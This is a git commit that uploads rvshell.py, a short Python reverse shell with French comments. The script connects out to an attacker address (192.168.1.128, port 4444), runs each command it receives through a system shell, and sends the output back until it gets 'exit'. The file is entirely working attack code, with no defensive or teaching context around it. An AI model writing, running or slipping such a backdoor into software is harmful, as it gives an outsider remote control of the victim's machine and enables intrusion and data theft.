6e0f4461e320a81d440a1a68484051796285e171
FoXhack1 <fox.pclyc@gmail.com>
2024-05-21 08:32:57 +0200

    Add files via upload

---
+++ rvshell.py
@@ -0,0 +1,38 @@
+import socket
+import subprocess
+import os
+
+# Définissez l'adresse IP et le port de l'attaquant
+HOST = '192.168.1.128'
+PORT = 4444
+
+# Créez un objet socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Connectez-vous à la machine de l'attaquant
+s.connect((HOST, PORT))
+
+# Envoyez un message à l'attaquant pour confirmer la connexion
+s.send(bytes('Connecté au shell inverse!', 'utf-8'))
+
+# Ouvrez un shell interactif
+while True:
+    # Recevez une commande de l'attaquant
+    commande = s.recv(1024).decode('utf-8')
+
+    # Si la commande est 'exit', sortez de la boucle
+    if commande == 'exit':
+        break
+
+    # Exécutez la commande et capturez la sortie
+    try:
+        output = subprocess.check_output(commande, shell=True, stderr=subprocess.STDOUT)
+        s.send(output)
+    except Exception as e:
+        s.send(str(e).encode('utf-8'))
+
+    # Envoyez un prompt pour indiquer que le shell est prêt à recevoir une nouvelle commande
+    s.send(b'$ ')
+
+# Fermez la connexion
+s.close()
